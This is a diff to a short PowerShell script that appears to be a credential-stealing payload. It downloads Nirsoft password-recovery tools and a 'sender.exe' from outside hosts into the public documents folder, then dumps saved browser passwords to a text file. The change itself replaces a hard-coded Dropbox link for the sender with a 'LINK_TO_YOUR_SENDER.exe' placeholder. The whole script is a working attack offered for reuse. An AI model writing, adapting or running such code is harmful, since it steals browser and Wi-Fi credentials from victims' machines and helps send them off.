@@ -1,6 +1,6 @@
 Set-Location C:\Users\Public\Documents
 Invoke-WebRequest "https://github.com/kidarok/Nirsoft_Tools/blob/main/WebBrowserPassView.exe?raw=true" -OutFile WebBrowserPassView.exe
-Invoke-WebRequest "https://www.dropbox.com/scl/fi/ifqiidqe5xw9zmnt38ey5/sender.exe?rlkey=8evebo34uqzbnt83swh3kxv8x&dl=1" -OutFile sender.exe
+Invoke-WebRequest "LINK_TO_YOUR_SENDER.exe" -OutFile sender.exe
 Invoke-WebRequest "https://github.com/kidarok/Nirsoft_Tools/blob/main/WirelessKeyView.exe?raw=true" -OutFile WirelessKeyView.exe
 .\WebBrowserPassView.exe /stext f.txt
 Start-Sleep 3
